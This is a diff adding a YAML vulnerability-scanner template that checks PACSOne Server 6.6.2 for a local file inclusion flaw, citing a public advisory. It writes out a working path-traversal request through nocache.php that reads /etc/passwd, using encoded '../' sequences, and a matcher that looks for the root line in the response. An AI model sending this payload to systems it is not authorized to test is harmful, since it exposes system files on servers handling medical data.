@@ -1,0 +1,28 @@
+id: "pacsone-server-lfi"
+name: "PACSOne Server 6.6.2 - Local File Inclusion"
+severity: "high"
+description: "PACSOne Server 6.6.2 is vulnerable to local file inclusion via its integrated DICOM Web Viewer."
+tech:
+  - "php"
+tags:
+  - "pacsone"
+  - "lfi"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://cxsecurity.com/issue/WLB-2018010303"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:[x*]:0:0"
+  - type: "status"
+    status:
+      - 200
